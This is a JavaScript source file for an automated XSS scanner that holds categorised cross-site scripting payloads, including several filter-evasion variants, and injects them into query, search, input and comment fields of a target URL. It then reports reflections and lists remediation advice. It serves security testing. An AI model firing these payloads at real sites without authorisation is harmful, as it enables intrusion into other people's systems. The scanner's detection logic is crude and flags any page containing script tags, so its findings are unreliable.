// xss-testing-framework.js
class XSSTestingFramework {
  constructor() {
    this.payloads = {
      'basic': [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(`XSS`)'>"
      ],
      'advanced': [
        "javascript:alert('XSS')",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
        "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>",
        "<svg><script>alert('XSS')</script></svg>",
        "<div style='background-image:url(javascript:alert("XSS"))'>"
      ],
      'dom_based': [
        "#<img src=x onerror=alert('XSS')>",
        "?param=<script>alert('XSS')</script>",
        "' onmouseover='alert("XSS")",
        "\" onfocus='alert("XSS") autofocus",
        "<script>document.write('<img src=x onerror=alert(1)>')</script>"
      ],
      'filter_evasion': [
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<img src=x onerror=alert('XSS') ",
        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
        "<img src=x oneonerrorrror=alert('XSS')>",
        "<img src=x onerror=eval('al' + 'ert(\'XSS\')')>",
        "<img src=x onerror=window['alert']('XSS')>",
        "<img src=x onerror=Function('alert(\'XSS\')')()>"
      ]
    };

    this.contexts = ['html', 'attribute', 'javascript', 'url', 'css'];
    this.xssIndicators = [
      /<script>/i,
      /alert\(/i,
      /onerror=/i,
      /onload=/i,
      /javascript:/i,
      /data:text\/html/i,
      /eval\(/i
    ];
  }

  async testEndpoint(url, method = 'GET', params = {}) {
    const results = {
      url,
      method,
      timestamp: new Date().toISOString(),
      vulnerabilities: [],
      testedPayloads: 0,
      safePayloads: 0
    };

    for (const [category, payloadList] of Object.entries(this.payloads)) {
      for (const payload of payloadList) {
        results.testedPayloads++;

        try {
          const response = await this.sendRequest(url, method, params, payload);
          const isVulnerable = this.analyzeResponse(response, payload);

          if (isVulnerable) {
            results.vulnerabilities.push({
              category,
              payload,
              severity: this.determineSeverity(category),
              context: this.determineContext(response, payload),
              evidence: response.body.substring(0, 500),
              cwe: 'CWE-79',
              owasp: 'A03:2021-Injection'
            });
          } else {
            results.safePayloads++;
          }

        } catch (error) {
          console.error(`Error testing payload ${payload}:`, error.message);
        }
      }
    }

    return results;
  }

  async sendRequest(url, method, baseParams, payload) {
    // Test payload in different injection points
    const testCases = [
      { ...baseParams, q: payload },          // Query parameter
      { ...baseParams, search: payload },     // Search parameter
      { ...baseParams, input: payload },      // Generic input
      { ...baseParams, comment: payload }     // Comment/textarea
    ];

    let vulnerableResponse = null;

    for (const params of testCases) {
      const options = {
        method: method.toUpperCase(),
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      };

      if (method.toUpperCase() === 'GET') {
        const queryString = new URLSearchParams(params).toString();
        const testUrl = `${url}?${queryString}`;

        const response = await fetch(testUrl, options);
        const body = await response.text();

        if (this.containsXSSIndicators(body, payload)) {
          vulnerableResponse = { status: response.status, body, params };
          break;
        }

      } else if (method.toUpperCase() === 'POST') {
        options.body = new URLSearchParams(params).toString();

        const response = await fetch(url, options);
        const body = await response.text();

        if (this.containsXSSIndicators(body, payload)) {
          vulnerableResponse = { status: response.status, body, params };
          break;
        }
      }
    }

    return vulnerableResponse || { status: 200, body: '', params: {} };
  }

  containsXSSIndicators(body, payload) {
    // Check if payload is reflected without proper encoding
    if (body.includes(payload)) {
      return true;
    }

    // Check for XSS indicators in response
    for (const indicator of this.xssIndicators) {
      if (indicator.test(body)) {
        return true;
      }
    }

    // Check for encoded payload reflection
    const encodedPayloads = [
      encodeURIComponent(payload),
      encodeURI(payload),
      payload.replace(/</g, '&lt;').replace(/>/g, '&gt;')
    ];

    for (const encoded of encodedPayloads) {
      if (body.includes(encoded) && encoded !== payload) {
        // Check if it's properly encoded (not executable)
        const decoded = this.decodeIfPossible(encoded);
        if (decoded === payload) {
          return false; // Properly encoded
        }
      }
    }

    return false;
  }

  analyzeResponse(response, payload) {
    if (!response.body) return false;

    const body = response.body.toLowerCase();
    const lowerPayload = payload.toLowerCase();

    // Direct payload reflection
    if (body.includes(lowerPayload)) {
      // Check if it's within script tags or event handlers
      const payloadIndex = body.indexOf(lowerPayload);
      const context = this.getSurroundingContext(body, payloadIndex);

      if (context.includes('<script>') || 
          context.includes('onerror') ||
          context.includes('onload') ||
          context.includes('javascript:')) {
        return true;
      }
    }

    // Check for XSS indicators
    return this.xssIndicators.some(indicator => indicator.test(body));
  }

  getSurroundingContext(body, index, radius = 50) {
    const start = Math.max(0, index - radius);
    const end = Math.min(body.length, index + radius);
    return body.substring(start, end);
  }

  decodeIfPossible(encoded) {
    try {
      return decodeURIComponent(encoded);
    } catch {
      try {
        return decodeURI(encoded);
      } catch {
        return encoded;
      }
    }
  }

  determineSeverity(category) {
    const severityMap = {
      'basic': 'High',
      'advanced': 'High',
      'dom_based': 'Medium',
      'filter_evasion': 'High'
    };
    return severityMap[category] || 'Medium';
  }

  determineContext(response, payload) {
    const body = response.body.toLowerCase();

    if (body.includes('<script>') && body.includes('</script>')) {
      return 'JavaScript context';
    } else if (body.includes('onerror=') || body.includes('onload=')) {
      return 'Event handler context';
    } else if (body.includes('href=') || body.includes('src=')) {
      return 'Attribute context';
    } else if (body.includes('style=')) {
      return 'CSS context';
    } else {
      return 'HTML body context';
    }
  }

  generateReport(results) {
    return {
      summary: {
        totalTested: results.testedPayloads,
        vulnerabilitiesFound: results.vulnerabilities.length,
        safePayloads: results.safePayloads,
        vulnerabilityRate: (results.vulnerabilities.length / results.testedPayloads * 100).toFixed(2) + '%'
      },
      vulnerabilities: results.vulnerabilities,
      recommendations: [
        'Implement Content Security Policy (CSP)',
        'Use proper output encoding for all user input',
        'Validate and sanitize all input data',
        'Use modern frameworks with built-in XSS protection',
        'Regular security testing and code reviews'
      ],
      metadata: {
        generatedAt: results.timestamp,
        toolVersion: '2.0.0',
        owaspReference: 'https://owasp.org/www-project-top-ten/'
      }
    };
  }
}

// Usage example
const xssTester = new XSSTestingFramework();

// Test a URL for XSS vulnerabilities
async function runXSSTests() {
  const results = await xssTester.testEndpoint(
    'https://example.com/search',
    'GET',
    { q: 'test' }
  );

  const report = xssTester.generateReport(results);
  console.log('XSS Testing Report:', report);

  return report;
}

// Run tests
runXSSTests().then(report => {
  if (report.summary.vulnerabilitiesFound > 0) {
    console.log('⚠️ XSS vulnerabilities found!');
    report.vulnerabilities.forEach(vuln => {
      console.log(`  ${vuln.severity}: ${vuln.payload.substring(0, 50)}...`);
    });
  } else {
    console.log('✅ No XSS vulnerabilities detected');
  }
});

